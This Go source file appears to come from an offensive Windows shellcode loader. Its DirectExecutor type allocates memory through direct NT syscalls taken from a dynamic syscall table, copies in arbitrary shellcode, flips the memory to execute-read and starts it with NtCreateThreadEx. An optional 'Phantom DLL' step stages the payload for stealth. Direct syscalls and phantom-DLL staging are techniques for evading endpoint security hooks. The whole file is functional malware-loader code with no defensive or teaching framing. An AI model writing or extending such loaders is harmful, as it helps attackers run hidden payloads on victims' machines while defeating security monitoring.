package main

import (
	"fmt"
	"unsafe"
	"golang.org/x/sys/windows"
)

// Constants (Keep necessary ones for fallback)
const (
	MEM_COMMIT        = windows.MEM_COMMIT
	MEM_RESERVE       = windows.MEM_RESERVE
	// PAGE_READWRITE    = windows.PAGE_READWRITE // Defined elsewhere or in windows pkg
	// PAGE_EXECUTE_READ = windows.PAGE_EXECUTE_READ // Defined elsewhere
	THREAD_ALL_ACCESS = 0x1F03FF // Or use windows.THREAD_ALL_ACCESS
)

// Simplified executor struct (No ROP fields)
type DirectExecutor struct {
	SyscallTable *DynamicSyscallTable
	PhantomDLL   *PhantomDLL // Optional: Used for initial placement
}

// Updated constructor
func NewDirectExecutor(syscallTable *DynamicSyscallTable, phantomDLL *PhantomDLL) *DirectExecutor {
	return &DirectExecutor{
		SyscallTable: syscallTable,
		PhantomDLL:   phantomDLL, 
	}
}

// Simplified execution function - uses only direct allocation logic
func (t *DirectExecutor) ExecuteShellcode(shellcode []byte) error {

	// Optional: Keep PhantomDLL injection for initial stealth placement?
	if t.PhantomDLL != nil {
		printInfo("[+] Injecting shellcode into Phantom DLL memory (as initial holding step)...\n")
		err := t.PhantomDLL.InjectShellcode(shellcode)
		if err != nil {
			printWarn("[WARN] Failed Phantom DLL injection (continuing anyway): %v\n", err)
		} else {
			printSuccess("[+] Shellcode placed in Phantom DLL memory.\n")
		}
	}

	// --- Direct Execution Logic ---
	printInfo("[+] Allocating new private memory block for shellcode...\n")
	var allocBase uintptr
	allocSize := uintptr(len(shellcode))
	errAlloc := t.SyscallTable.NtAllocateVirtualMemory(
		windows.CurrentProcess(),
		&allocBase,
		0,
		&allocSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		PAGE_READWRITE,
	)
	if errAlloc != nil {
		printError("[ERROR] NtAllocateVirtualMemory failed: %v\n", errAlloc)
		return fmt.Errorf("ExecuteShellcode: NtAllocateVirtualMemory failed: %v", errAlloc)
	}
	printSuccess("[+] Allocated %d bytes at 0x%x\n", allocSize, allocBase) 

	// Copy shellcode to new allocation
	printInfo("[+] Copying shellcode to new allocation...\n")
	var bytesWritten uintptr
	errWrite := t.SyscallTable.NtWriteVirtualMemory(
		windows.CurrentProcess(),
		allocBase,
		unsafe.Pointer(&shellcode[0]),
		allocSize,
		&bytesWritten,
	)
	if errWrite != nil || bytesWritten != allocSize {
		printError("[ERROR] NtWriteVirtualMemory failed (wrote %d/%d): %v\n", bytesWritten, allocSize, errWrite)
		windows.VirtualFree(allocBase, 0, windows.MEM_RELEASE) // Attempt cleanup
		return fmt.Errorf("ExecuteShellcode: NtWriteVirtualMemory failed (wrote %d/%d): %v", bytesWritten, allocSize, errWrite)
	}
	printSuccess("[+] Shellcode copied successfully.\n") 

	// Change new allocation protection to RX
	printInfo("[+] Changing new allocation protection to PAGE_EXECUTE_READ...\n")
	var oldProtect uint32
	errProtect := t.SyscallTable.NtProtectVirtualMemory(
		windows.CurrentProcess(),
		&allocBase,
		&allocSize,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if errProtect != nil {
		printError("[ERROR] NtProtectVirtualMemory failed: %v\n", errProtect)
		windows.VirtualFree(allocBase, 0, windows.MEM_RELEASE) // Attempt cleanup
		return fmt.Errorf("ExecuteShellcode: NtProtectVirtualMemory failed: %v", errProtect)
	}
	printSuccess("[+] Protection set to PAGE_EXECUTE_READ.\n") 

	// Create thread pointing to the NEW allocation
	var threadHandle windows.Handle
	printInfo("[+] Calling NtCreateThreadEx with StartAddress: 0x%x (New Allocation)\n", allocBase)
	err := t.SyscallTable.NtCreateThreadEx(
		&threadHandle,
		THREAD_ALL_ACCESS,
		0,
		windows.CurrentProcess(),
		allocBase, // StartAddress
		0,
		0, // CreateFlags (0 = run immediately)
		0,
		0,
		0,
		0,
	)
	if err != nil {
		printError("[ERROR] NtCreateThreadEx failed: %v\n", err)
		windows.VirtualFree(allocBase, 0, windows.MEM_RELEASE) // Attempt cleanup
		return fmt.Errorf("ExecuteShellcode: NtCreateThreadEx failed: %v", err)
	}
	printSuccess("[+] Thread created successfully (Handle: %d). Waiting for execution...\n", threadHandle)

	// Wait for the thread to complete
	err = t.SyscallTable.NtWaitForSingleObject(threadHandle, false, nil) // Infinite wait
	if err != nil {
		printWarn("[WARN] NtWaitForSingleObject failed: %v\n", err) 
	}
	// No explicit success message for wait, thread exit is implicit

	// Clean up thread handle
	err = t.SyscallTable.NtCloseWrapper(threadHandle)
	if err != nil {
		printWarn("[WARN] NtClose failed for thread handle %d: %v\n", threadHandle, err)
	}

	// Clean up the allocated memory for the shellcode
	errFree := windows.VirtualFree(allocBase, 0, windows.MEM_RELEASE)
	if errFree != nil {
		printWarn("[WARN] VirtualFree failed for shellcode memory 0x%x: %v\n", allocBase, errFree)
	}

	// Final status printed by the caller (EnhancedExecutor.Execute)
	return nil // Execution attempted
}
